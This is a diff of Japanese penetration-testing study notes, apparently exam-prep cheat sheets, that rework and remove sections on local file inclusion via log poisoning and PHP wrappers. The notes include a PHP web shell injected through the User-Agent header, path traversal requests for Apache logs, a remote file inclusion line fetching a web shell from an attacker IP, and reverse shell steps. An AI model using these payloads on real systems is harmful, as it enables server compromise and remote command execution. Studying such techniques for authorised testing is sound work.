@@ -52,17 +52,15 @@ curl http://example.com/index.php?page=../../../../../../../../../var/log/apache
 
 ![](../../Images/Pasted%20image%2020250322224544.png)
 
-
+$$User-Agentにペイロードを注入$$
 
 3. LFIでログファイルを読み込み、WebShellが実行されるか確認する（URLエンコードすること）
-
 ```http
 GET /index.php?page=../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
 ```
+- →`ps`の結果が返ってきたら成功
 
-`ps`の結果が返ってきたら成功。
-
-4. リバースシェルリスナーを立て、リバースシェルコマンドをURLエンコードして実行する → [bashでリバースシェルを確立する基本的なコマンド](https://claude.ai/Cheatsheet/Common/%E5%BF%98%E3%82%8C%E3%81%8C%E3%81%A1%E3%81%AA%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89\(Linux%E3%83%BBWindows\).md#bash%E3%81%A7%E3%83%AA%E3%83%90%E3%83%BC%E3%82%B9%E3%82%B7%E3%82%A7%E3%83%AB%E3%82%92%E7%A2%BA%E7%AB%8B%E3%81%99%E3%82%8B%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E3%82%B3%E3%83%9E%E3%83%B3%E3%83%89)
+4. リバースシェルリスナーを立て、リバースシェルコマンドをURLエンコードして実行する（[Bashだけで完結する手法](../Common/Bind%20&%20Reverse%20Shell・ペイロード・安定化手法.md#Bashだけで完結する手法)）
 
 ---
 
@@ -74,22 +72,23 @@ PHPのwrapperを使ってLFIを拡張できる。
 
 **用途：** PHPファイルの内容を**実行せずに**表示する。コードの中身を丸ごと閲覧でき、機密情報の取得やアプリのロジック解析に使える。
 
-> [!NOTE] `.php` だけでなく `.py` など他の実行可能ファイルにも使える。
+> [!NOTE] 
+> `.php` だけでなく `.py` など他の実行可能ファイルにも使える。
 
 #### 手順
 
 1. HTTPリクエストでファイルを指定している箇所を見つける
-
 ```
 http://example.com/index.php?page=admin.php
 ```
 
 2. Burp Suiteでファイルを実行した結果を確認し、タグが閉じられていないなど不自然なコードがないか探す
 
-![](https://claude.ai/Images/Pasted%20image%2020250329113419.png)
+![](../../Images/Pasted%20image%2020250329113419.png)
+
+$$bodyタグが閉じられていない$$
 
 3. `php://filter` wrapperでファイルの中身を表示する（結果が変わらない場合は次のステップへ）
-
 ```
 GET /index.php?page=php://filter/resource=admin.php
 ```
@@ -173,44 +172,6 @@ GET /index.php?page=http://<attacker_IP>/<webshell.php>&cmd=ls
 
 ---
 ---
-
-
-### LFI x ログポイズニング 
-
-- 概要：Webサーバーが取得するアクセスログに悪意あるWebShellを読み込ませて、実行させる
-- 攻撃条件：どの値が攻撃者によって制御可能なのかを知っていること
-	- 今回は、ログファイルがRead, Write可能であるため、ログファイルの中身を明らかにすること
-
-- 汚染するログファイルの場所については、Webサーバーソフトウェアのドキュメントを読んで探す
-	- Windowsの場合は、アプリケーション固有の場所にある（例えば、XAMPPが稼働している場合は、`C:¥xampp¥apache¥logs¥`にある）
-
-#### LFI x ログポイズニングの流れ
-
-1. LFI（ここではPath traversalと同等）の脆弱性を用いて、ログファイルに何が記録されるか読みとる
-```zsh
-curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
-...
-192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] "GET /meteor/index.php?page=admin.php HTTP/1.1" 200 2218 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"
-...
-```
-- ↑User-agentがログに記録されることがわかる＝ユーザー制御可能
-
-2. ログを取得しているパス(上記3行目GET以降)に対し、ユーザー制御可能な値（今回はUser-Agent）にWebShellペイロードを実装し、HTTPリクエスト
-```php
-<?php echo system($_GET['cmd']); ?>
-```
-
-![](../../Images/Pasted%20image%2020250322224544.png)
-
-$$User-Agentにペイロードを注入$$
-
-3. ステップ２でWebShellペイロードがログファイルに記録されているかどうかを確認するため、プロセスを閲覧する（URL encodeすること）
-```http
-meteor/index.php?page=../../../../../var/log/apache2/access.log&cmd=ps HTTP/1.1
-```
-- `ps`の結果が返ったら成功
-
-4. リバースシェルリスナーを立て、[忘れがちなコマンド(Linux・Windows)](../Cheatsheet/Common/忘れがちなコマンド(Linux・Windows).md#bashでリバースシェルを確立する基本的なコマンド)をURLエンコードして実行
 
 ### PHP Wrappers
 
